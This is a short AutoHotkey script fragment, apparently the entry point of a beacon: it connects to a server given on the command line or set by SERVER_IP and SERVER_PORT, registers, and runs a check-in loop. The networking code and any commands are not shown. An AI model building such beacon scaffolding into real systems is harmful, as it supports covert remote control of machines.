; ============================================================================
; MAIN ENTRY POINT
; ============================================================================
; Beacon initialization and main loop
; ============================================================================

if A_Args.Length = 1 {
    client := NetworkClient(A_Args[1])
}
else If A_Args.Length = 2{
    client := NetworkClient(A_Args[1], A_Args[2])
}
else {
    client := NetworkClient(SERVER_IP, SERVER_PORT)
}

if (client.Register()) {
    client.StartCheckInLoop()

    while client.isRunning {
        Sleep(1000)
    }
}
